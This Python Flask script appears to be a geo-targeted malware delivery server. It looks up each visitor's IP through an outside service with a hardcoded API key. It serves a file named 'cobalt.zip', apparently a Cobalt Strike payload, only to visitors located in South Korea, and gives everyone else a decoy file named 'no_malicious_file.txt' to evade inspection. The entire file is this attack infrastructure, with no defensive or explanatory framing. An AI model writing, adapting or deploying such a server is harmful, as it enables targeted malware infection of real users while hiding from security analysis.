from flask import Flask, request, send_file
import requests

app = Flask(__name__)

@app.route('/')
def home():
    path = 'files/'
    remote_addr = request.remote_addr
    api_param = {"key": "me58wbfwetp7mmq7is1fkqcgxcot", "host": remote_addr}
    
    res = requests.get(url="https://api.itforest.net/ipinfo", params=api_param)
    print(f'[*] api response: {res.json()}')
    
    country_code = res.json()["data"].get("country_code", None)

    if country_code == "KR":
        path += "cobalt.zip"

    else:
        path += "no_malicious_file.txt"

    return send_file(path, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)